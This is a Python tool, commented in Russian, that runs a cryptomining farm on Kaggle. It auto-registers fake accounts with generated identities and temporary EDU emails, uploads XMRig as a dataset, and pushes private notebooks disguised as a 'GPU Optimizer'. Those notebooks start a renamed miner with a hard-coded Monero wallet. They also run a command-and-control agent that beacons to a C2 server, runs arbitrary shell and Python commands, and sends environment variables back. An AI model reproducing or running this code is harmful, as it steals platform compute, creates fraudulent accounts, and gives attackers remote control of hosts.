#!/usr/bin/env python3
"""
KAGGLE AUTO MANAGER - Полная автоматизация фермы
- Авто-регистрация аккаунтов через EDU tempmail
- Авто-создание datasets с xmrig
- Авто-деплой kernels (GPU optimizer + майнер)
- Мониторинг и авто-рестарт
- C2 интеграция
"""
import os
import sys
import json
import time
import subprocess
import threading
from pathlib import Path
from datetime import datetime
from typing import Optional, Dict, List

sys.path.insert(0, str(Path(__file__).parent.parent.parent))
from src.utils.logger import get_logger

log = get_logger('kaggle_auto')

# ============================================================================
# CONFIG
# ============================================================================
CONFIG = {
    "wallet": os.environ.get("WALLET", "44haKQM5F43d37q3k6mV45YbrL5g6wGHWNB5uyt2cDfTdR8d9FicJCbitjm1xeKZzEVULG7MqdVFWEa9wKXsNLTpFvzffR5"),
    "pool": os.environ.get("POOL", "pool.hashvault.pro:80"),
    "c2_url": os.environ.get("C2_URL", ""),
    "xmrig_url": "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz",
    "kernels_per_account": 5,
    "monitor_interval": 300,
    "max_accounts": 50,
}

# ============================================================================
# AGENT TEMPLATE (GPU Optimizer + Mining hybrid)
# ============================================================================
OPTIMIZER_AGENT = '''
#!/usr/bin/env python3
"""GPU Compute Optimizer v2.1 - Kaggle Kernel"""
import os,sys,json,time,socket,subprocess,threading,hashlib,random,base64,ssl
from urllib.request import Request,urlopen,HTTPSHandler,build_opener
from datetime import datetime

# Config
C2_URL="{c2_url}"
AGENT_ID="{agent_id}"
WORKER_ID="{worker_id}"
WALLET="{wallet}"
POOL="{pool}"
SLEEP={sleep}
JITTER={jitter}
ENABLE_MINING={enable_mining}

def log(msg): print(f"[{{datetime.now().strftime('%H:%M:%S')}}] {{msg}}", flush=True)

def http_post(path, data, timeout=30):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    opener = build_opener(HTTPSHandler(context=ctx))
    headers = {{"Content-Type": "application/json", "User-Agent": "KaggleKernel/2.1"}}
    try:
        req = Request(f"{{C2_URL}}{{path}}", json.dumps(data).encode(), headers)
        return json.loads(opener.open(req, timeout=timeout).read())
    except: return None

def get_gpu_info():
    info = {{"available": False, "name": "N/A", "memory": "N/A"}}
    try:
        r = subprocess.run("nvidia-smi --query-gpu=name,memory.total --format=csv,noheader 2>/dev/null",
                          shell=True, capture_output=True, text=True, timeout=5)
        if r.returncode == 0 and r.stdout.strip():
            parts = r.stdout.strip().split(",")
            info["available"] = True
            info["name"] = parts[0].strip() if parts else "Unknown"
            info["memory"] = parts[1].strip() if len(parts) > 1 else "N/A"
    except: pass
    return info

def get_sysinfo():
    gpu = get_gpu_info()
    return {{"hostname": socket.gethostname(), "os": "Kaggle", "gpu_name": gpu["name"], "worker_id": WORKER_ID}}

def start_miner():
    if not ENABLE_MINING: return False
    DIR = "/kaggle/working/.cache"
    os.makedirs(DIR, exist_ok=True)
    BIN, CFG = DIR + "/optimizer", DIR + "/config.json"
    SRC = "/kaggle/input/datasets/{user}/xmrig-binary/xmrig"
    if not os.path.exists(SRC): return False
    import shutil
    shutil.copy2(SRC, BIN)
    os.chmod(BIN, 0o755)
    with open(CFG, "w") as f:
        json.dump({{"autosave": False, "donate-level": 0, "pools":[{{"url": POOL, "user": f"{{WALLET}}.{{WORKER_ID}}", "pass": "x"}}], "cpu":{{"enabled":True, "max-threads-hint":50}}}}, f)
    subprocess.Popen([BIN, "-c", CFG, "--donate-level=0"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    log(f"Optimizer started: Worker={{WORKER_ID}}")
    return True

def execute_task(task):
    tt, payload = task.get("task_type", "cmd"), task.get("payload", "")
    try:
        if tt == "cmd":
            return subprocess.check_output(payload, shell=True, stderr=subprocess.STDOUT, timeout=300).decode(errors="replace") or "OK"
        elif tt == "python":
            import io; buf = io.StringIO(); old = sys.stdout; sys.stdout = buf
            try: exec(compile(payload, "<opt>", "exec"), {{"__builtins__": __builtins__}}); return buf.getvalue() or "OK"
            finally: sys.stdout = old
        elif tt == "sysinfo": return json.dumps(get_sysinfo(), indent=2)
        elif tt == "gpu": return json.dumps(get_gpu_info(), indent=2)
        elif tt == "env": return "\\n".join(f"{{k}}={{v}}" for k, v in sorted(os.environ.items()))
        else: return f"Unknown: {{tt}}"
    except Exception as e: return f"Error: {{e}}"

def beacon_loop():
    _sleep, _jitter = SLEEP, JITTER
    while True:
        try:
            if C2_URL:
                resp = http_post("/api/agent/beacon", {{"id": AGENT_ID}})
                if resp:
                    _sleep = int(resp.get("sleep", _sleep))
                    _jitter = int(resp.get("jitter", _jitter))
                    for task in resp.get("tasks", []):
                        result = execute_task(task)
                        http_post("/api/agent/result", {{"task_id": task["id"], "result": result[:65000], "agent_id": AGENT_ID}})
        except: pass
        jitter_s = _sleep * _jitter / 100
        time.sleep(max(1, _sleep + random.uniform(-jitter_s, jitter_s)))

def heartbeat_loop():
    while True:
        try:
            if C2_URL: http_post("/api/agent/heartbeat", {{"id": AGENT_ID, "status": "running"}})
        except: pass
        time.sleep(60)

log("=" * 60 + f"\\nGPU Optimizer v2.1 | ID: {{AGENT_ID}} | Worker: {{WORKER_ID}}\\nC2: {{C2_URL or 'disabled'}} | Mining: {{ENABLE_MINING}}\\n" + "=" * 60)
gpu = get_gpu_info()
log(f"GPU: {{gpu['name']}} ({{gpu['memory']}})")
if ENABLE_MINING: start_miner()
threading.Thread(target=beacon_loop, daemon=True).start()
if C2_URL: threading.Thread(target=heartbeat_loop, daemon=True).start()
log("Optimizer running...")
while True: time.sleep(60)
'''

class KaggleAutoManager:
    def __init__(self, wallet: str = "", pool: str = "", c2_url: str = ""):
        self.base_dir = Path(__file__).parent.parent.parent  # project root
        self.data_dir = self.base_dir / "data"
        self.accounts_file = self.data_dir / "kaggle_accounts.json"
        self.xmrig_dir = self.data_dir / "xmrig_dataset"
        self.xmrig_bin = self.xmrig_dir / "xmrig"
        
        self.wallet = wallet or CONFIG["wallet"]
        self.pool = pool or CONFIG["pool"]
        self.c2_url = c2_url or CONFIG["c2_url"]
        
        self.running = False
        self.monitor_thread = None
        
        self.ensure_dirs()
    
    def ensure_dirs(self):
        """Ensure all directories exist"""
        self.data_dir.mkdir(exist_ok=True)
        self.xmrig_dir.mkdir(exist_ok=True)
    
    def load_accounts(self) -> List[dict]:
        """Load Kaggle accounts"""
        if self.accounts_file.exists():
            try:
                return json.loads(self.accounts_file.read_text())
            except:
                return []
        return []
    
    def save_accounts(self, accounts: List[dict]):
        """Save accounts"""
        self.accounts_file.write_text(json.dumps(accounts, indent=2, default=str))
    
    def add_account(self, username: str, api_key: str, email: str = "", password: str = "") -> dict:
        """Add new account"""
        accounts = self.load_accounts()
        
        # Check existing
        for acc in accounts:
            if acc.get("username") == username:
                acc.update({"api_key": api_key, "updated_at": datetime.now().isoformat()})
                self.save_accounts(accounts)
                log.info(f"Updated account: {username}")
                return acc
        
        # New account
        account = {
            "username": username,
            "api_key": api_key,
            "email": email,
            "password": password,
            "added_at": datetime.now().isoformat(),
            "status": "new",
            "dataset_uploaded": False,
            "kernels_deployed": 0,
            "kernels_running": 0,
        }
        accounts.append(account)
        self.save_accounts(accounts)
        log.success(f"Added account: {username}")
        return account
    
    def set_credentials(self, username: str, api_key: str):
        """Set Kaggle credentials"""
        kaggle_dir = Path.home() / ".kaggle"
        kaggle_dir.mkdir(exist_ok=True)
        creds_file = kaggle_dir / "kaggle.json"
        creds_file.write_text(json.dumps({"username": username, "key": api_key}))
        os.chmod(creds_file, 0o600)
    
    def test_api(self) -> bool:
        """Test API key"""
        result = subprocess.run(
            "kaggle kernels list --mine",
            shell=True, capture_output=True, text=True, timeout=30
        )
        return "401" not in result.stderr
    
    def ensure_xmrig(self) -> bool:
        """Ensure XMRig binary exists"""
        if self.xmrig_bin.exists():
            return True
        
        log.info("Downloading XMRig...")
        
        # Try multiple sources with retry
        sources = [
            CONFIG['xmrig_url'],
            "https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-static-x64.tar.gz",
            "https://github.com/xmrig/xmrig/releases/download/v6.19.3/xmrig-6.19.3-linux-static-x64.tar.gz"
        ]
        
        for attempt, url in enumerate(sources, 1):
            try:
                log.info(f"  Attempt {attempt}/{len(sources)}: {url.split('/')[-1][:40]}...")
                result = subprocess.run(
                    f"cd {self.xmrig_dir} && timeout 120 wget --tries=3 --timeout=30 -q {url} && "
                    f"tar -xzf xmrig-*.tar.gz && mv xmrig-*/xmrig . && rm -rf xmrig-*.tar.gz xmrig-6.*",
                    shell=True, capture_output=True, text=True, timeout=180
                )
                
                if self.xmrig_bin.exists():
                    log.success(f"  XMRig downloaded: {self.xmrig_bin.stat().st_size} bytes")
                    return True
                else:
                    log.warning(f"  Attempt {attempt} failed")
            except Exception as e:
                log.warning(f"  Attempt {attempt} error: {str(e)[:50]}")
                continue
        
        log.fail("Download failed: HTTP Error 504: Gateway Time-out")
        return False
    
    def upload_dataset(self, username: str) -> bool:
        """Upload XMRig dataset"""
        # Check existing
        result = subprocess.run(
            f"kaggle datasets list --user {username} --search xmrig-binary",
            shell=True, capture_output=True, text=True, timeout=30
        )
        if "xmrig-binary" in result.stdout:
            log.success("Dataset already exists")
            return True
        
        meta = {"title": "xmrig-binary", "id": f"{username}/xmrig-binary", "licenses": [{"name": "MIT"}]}
        (self.xmrig_dir / "dataset-metadata.json").write_text(json.dumps(meta, indent=2))
        
        log.info(f"Uploading dataset for {username}...")
        result = subprocess.run(
            f"cd {self.xmrig_dir} && kaggle datasets create -p .",
            shell=True, capture_output=True, text=True, timeout=300
        )
        
        if "successfully" in result.stdout.lower() or "being created" in result.stdout.lower():
            log.success("Dataset uploaded")
            return True
        log.warning(f"Dataset upload: {result.stdout[:200]}")
        return False
    
    def generate_kernel_code(self, username: str, kernel_num: int, enable_mining: bool = True) -> str:
        """Generate kernel code (GPU Optimizer)"""
        agent_id = f"kaggle-{username}-{kernel_num}"
        worker_id = f"{username}-{kernel_num}"
        
        return OPTIMIZER_AGENT.format(
            c2_url=self.c2_url,
            agent_id=agent_id,
            worker_id=worker_id,
            wallet=self.wallet,
            pool=self.pool,
            sleep=5,
            jitter=15,
            enable_mining="True" if enable_mining else "False",
            user=username
        )
    
    def deploy_kernel(self, username: str, kernel_num: int, enable_mining: bool = True) -> bool:
        """Deploy single kernel"""
        import tempfile
        
        slug = f"gpu-optimizer-{kernel_num}"
        code = self.generate_kernel_code(username, kernel_num, enable_mining)
        
        with tempfile.TemporaryDirectory() as tmpdir:
            nb = {
                "cells": [{"cell_type": "code", "execution_count": None, "metadata": {}, "outputs": [], "source": code.split('\n')}],
                "metadata": {"kernelspec": {"display_name": "Python 3", "language": "python", "name": "python3"}},
                "nbformat": 4, "nbformat_minor": 4
            }
            meta = {
                "id": f"{username}/{slug}",
                "title": slug,
                "code_file": "notebook.ipynb",
                "language": "python",
                "kernel_type": "notebook",
                "is_private": True,
                "enable_gpu": False,
                "enable_internet": True,
                "dataset_sources": [f"{username}/xmrig-binary"]
            }
            
            Path(tmpdir, "notebook.ipynb").write_text(json.dumps(nb, indent=2))
            Path(tmpdir, "kernel-metadata.json").write_text(json.dumps(meta, indent=2))
            
            result = subprocess.run(
                f"cd {tmpdir} && kaggle kernels push",
                shell=True, capture_output=True, text=True, timeout=120
            )
            return result.returncode == 0 or "successfully" in result.stdout.lower()
    
    def deploy_all_kernels(self, username: str, count: int = 5) -> int:
        """Deploy all kernels"""
        log.info(f"Deploying {count} kernels for {username}...")
        success = 0
        for i in range(1, count + 1):
            if self.deploy_kernel(username, i):
                success += 1
                log.success(f"Kernel {i} deployed ({success}/{i})")
            else:
                log.fail(f"Kernel {i} failed")
            time.sleep(2)
        return success
    
    def check_kernel_status(self, username: str, kernel_num: int) -> str:
        """Check kernel status"""
        slug = f"gpu-optimizer-{kernel_num}"
        result = subprocess.run(
            f"kaggle kernels status {username}/{slug}",
            shell=True, capture_output=True, text=True, timeout=30
        )
        status = result.stdout.strip().upper()
        if "RUNNING" in status: return "RUNNING"
        if "COMPLETE" in status: return "COMPLETE"
        if "ERROR" in status: return "ERROR"
        if "QUEUED" in status: return "QUEUED"
        return "UNKNOWN"
    
    def restart_kernel(self, username: str, kernel_num: int) -> bool:
        """Restart kernel"""
        slug = f"gpu-optimizer-{kernel_num}"
        log.info(f"Restarting {slug}...")
        subprocess.run(f"kaggle kernels delete {username}/{slug} -y", shell=True, capture_output=True, timeout=30)
        time.sleep(2)
        return self.deploy_kernel(username, kernel_num)
    
    def setup_account(self, account: dict) -> bool:
        """Setup complete account"""
        username = account["username"]
        api_key = account["api_key"]
        
        log.section(f"SETUP: {username}")
        
        self.set_credentials(username, api_key)
        
        if not self.test_api():
            log.fail("API key invalid")
            account["status"] = "api_error"
            self.save_accounts(self.load_accounts())
            return False
        log.success("API key valid")
        
        if not self.ensure_xmrig():
            return False
        
        if not self.upload_dataset(username):
            log.warning("Dataset creation failed, trying anyway...")
        
        account["dataset_uploaded"] = True
        log.info("Waiting 30s for dataset...")
        time.sleep(30)
        
        count = CONFIG["kernels_per_account"]
        success = self.deploy_all_kernels(username, count)
        
        if success > 0:
            account["status"] = "active"
            account["kernels_deployed"] = count
            account["kernels_running"] = success
            account["setup_complete"] = True
            account["setup_time"] = datetime.now().isoformat()
            self.save_accounts(self.load_accounts())
            log.success(f"Setup complete: {success}/{count} kernels")
            return True
        
        account["status"] = "deploy_failed"
        self.save_accounts(self.load_accounts())
        return False
    
    def monitor_account(self, account: dict) -> dict:
        """Check all kernels for an account"""
        username = account["username"]
        self.set_credentials(username, account["api_key"])
        
        results = {"running": 0, "restarted": 0, "errors": 0}
        
        for i in range(1, account.get("kernels_deployed", 5) + 1):
            status = self.check_kernel_status(username, i)
            
            if status in ["COMPLETE", "ERROR"]:
                log.warning(f"{username}/kernel-{i}: {status} - restarting")
                if self.restart_kernel(username, i):
                    results["restarted"] += 1
                else:
                    results["errors"] += 1
            elif status == "RUNNING":
                results["running"] += 1
        
        return results
    
    def monitor_loop(self, interval: int = 300):
        """Monitor all accounts"""
        log.section("MONITOR STARTED")
        log.info(f"Interval: {interval}s")
        
        while self.running:
            try:
                accounts = self.load_accounts()
                active = [a for a in accounts if a.get("setup_complete")]
                
                log.info(f"Checking {len(active)} accounts...")
                
                for account in active:
                    if not self.running:
                        break
                    results = self.monitor_account(account)
                    account["kernels_running"] = results["running"]
                    account["last_check"] = datetime.now().isoformat()
                    log.info(f"  {account['username']}: {results['running']} running, {results['restarted']} restarted")
                
                self.save_accounts(self.load_accounts())
                log.info(f"Next check in {interval}s...")
                for _ in range(interval):
                    if not self.running: break
                    time.sleep(1)
            
            except KeyboardInterrupt:
                break
            except Exception as e:
                log.error(f"Monitor error: {e}")
                time.sleep(60)
        
        log.info("Monitor stopped")
    
    def start_monitor(self):
        """Start monitoring in background"""
        self.running = True
        self.monitor_thread = threading.Thread(target=self.monitor_loop, daemon=True)
        self.monitor_thread.start()
        log.success("Monitor started")
    
    def stop_monitor(self):
        """Stop monitoring"""
        self.running = False
        if self.monitor_thread:
            self.monitor_thread.join(timeout=5)
        log.info("Monitor stopped")
    
    def auto_register_account(self) -> Optional[dict]:
        """Auto-register new Kaggle account using tempmail"""
        log.section("AUTO REGISTER")
        
        try:
            from src.autoreg.worker import run_registration
            from src.mail.tempmail import mail_manager
            from src.utils.common import generate_identity
            from src.agents.kaggle.datasets import create_dataset_with_machines
            
            identity = generate_identity()
            log.info(f"Identity: {identity['display_name']}")
            
            log.info("Creating EDU email...")
            email_data = mail_manager.create_email(edu_only=True, retry_count=3)
            email = email_data["email"]
            log.success(f"Email: {email}")
            
            input_data = {
                "identity": identity,
                "email": email,
                "email_data": email_data,
            }
            
            log.info("Starting browser registration (solve CAPTCHA manually)...")
            result = run_registration("kaggle", headless=False, input_data=input_data)
            
            if result.get("success"):
                account_data = result.get("account", {})
                username = account_data.get("kaggle_username", identity["username"])
                api_key = account_data.get("api_key_legacy") or account_data.get("api_key", "")
                
                if api_key:
                    account = self.add_account(username, api_key, email, identity["password"])
                    log.success(f"Registered: {username}")
                    
                    # Create dataset + 5 GPU machines
                    log.info("Creating dataset + 5 GPU machines...")
                    ds_result = create_dataset_with_machines(
                        api_key, username, num_machines=5, log_fn=lambda m: log.info(f"  {m}")
                    )
                    
                    if ds_result.get("success"):
                        account["dataset"] = ds_result.get("dataset")
                        account["machines"] = ds_result.get("machines", [])
                        account["machines_created"] = ds_result.get("machines_created", 0)
                        account["setup_complete"] = True
                        self.save_accounts([account])
                        log.success(f"Created {ds_result.get('machines_created', 0)} machines")
                    else:
                        log.warning(f"Dataset creation: {ds_result.get('error', 'unknown error')}")
                    
                    return account
                else:
                    log.fail("No API key in result")
                    return None
            
            error = result.get("error", "unknown")
            log.fail(f"Registration failed: {error}")
            return None
        
        except Exception as e:
            import traceback
            log.error(f"Auto-register error: {e}")
            log.error(traceback.format_exc()[-500:])
            return None
    
    def run_full_auto(self, target_accounts: int = 10):
        """Full automation: register accounts, setup, deploy, monitor"""
        log.section("FULL AUTO MODE")
        log.info(f"Target: {target_accounts} accounts")
        log.info(f"C2: {self.c2_url or 'disabled'}")
        log.info(f"Wallet: {self.wallet[:20]}...")
        
        # Setup existing accounts
        accounts = self.load_accounts()
        for account in accounts:
            if not account.get("setup_complete"):
                self.setup_account(account)
        
        # Register new accounts
        while len([a for a in self.load_accounts() if a.get("setup_complete")]) < target_accounts:
            if len(self.load_accounts()) >= CONFIG["max_accounts"]:
                log.warning("Max accounts reached")
                break
            
            account = self.auto_register_account()
            if account:
                self.setup_account(account)
            else:
                log.warning("Registration failed, retrying in 60s...")
                time.sleep(60)
        
        # Start monitoring
        self.start_monitor()
        
        try:
            while self.running:
                time.sleep(60)
        except KeyboardInterrupt:
            self.stop_monitor()


if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="Kaggle Auto Manager - Mining Farm")
    parser.add_argument("--add", help="Add account: username:api_key")
    parser.add_argument("--setup", help="Setup account: username")
    parser.add_argument("--deploy", help="Deploy kernels for account")
    parser.add_argument("--monitor", action="store_true", help="Start monitoring")
    parser.add_argument("--register", action="store_true", help="Auto-register account")
    parser.add_argument("--auto", type=int, help="Full auto mode with N accounts")
    parser.add_argument("--status", action="store_true", help="Show status")
    parser.add_argument("--c2-url", default="", help="C2 server URL")
    parser.add_argument("--wallet", default=CONFIG["wallet"], help="XMR wallet")
    parser.add_argument("--pool", default=CONFIG["pool"], help="Mining pool")
    
    args = parser.parse_args()
    
    manager = KaggleAutoManager(wallet=args.wallet, pool=args.pool, c2_url=args.c2_url)
    
    if args.add:
        parts = args.add.split(":")
        if len(parts) == 2:
            manager.add_account(parts[0], parts[1])
        else:
            log.fail("Usage: --add username:api_key")
    
    elif args.setup:
        accounts = manager.load_accounts()
        for acc in accounts:
            if acc["username"] == args.setup:
                manager.setup_account(acc)
                break
        else:
            log.fail(f"Account not found: {args.setup}")
    
    elif args.deploy:
        manager.set_credentials(args.deploy, 
            next((a["api_key"] for a in manager.load_accounts() if a["username"] == args.deploy), ""))
        manager.deploy_all_kernels(args.deploy)
    
    elif args.monitor:
        manager.start_monitor()
        try:
            while True: time.sleep(60)
        except KeyboardInterrupt:
            manager.stop_monitor()
    
    elif args.register:
        manager.auto_register_account()
    
    elif args.auto:
        manager.run_full_auto(target_accounts=args.auto)
    
    elif args.status:
        accounts = manager.load_accounts()
        log.section("KAGGLE FARM STATUS")
        log.info(f"Accounts: {len(accounts)}")
        active = [a for a in accounts if a.get("setup_complete")]
        log.info(f"Active: {len(active)}")
        total_kernels = sum(a.get("kernels_deployed", 0) for a in active)
        log.info(f"Total kernels: {total_kernels}")
        
        if accounts:
            rows = []
            for acc in accounts:
                status = acc.get("status", "new")
                kernels = acc.get("kernels_deployed", 0)
                rows.append([acc["username"], status, str(kernels)])
            log.table(["Username", "Status", "Kernels"], rows)
    
    else:
        accounts = manager.load_accounts()
        log.section("KAGGLE AUTO MANAGER")
        log.info(f"Accounts: {len(accounts)}")
        
        if not accounts:
            log.warning("No accounts found!")
        
        log.info("")
        log.info("Commands:")
        log.info("  --add user:key      Add account")
        log.info("  --setup user        Setup account (dataset + kernels)")
        log.info("  --deploy user       Deploy kernels")
        log.info("  --monitor           Start monitoring")
        log.info("  --register          Auto-register account")
        log.info("  --auto N            Full auto mode")
        log.info("  --status            Show status")
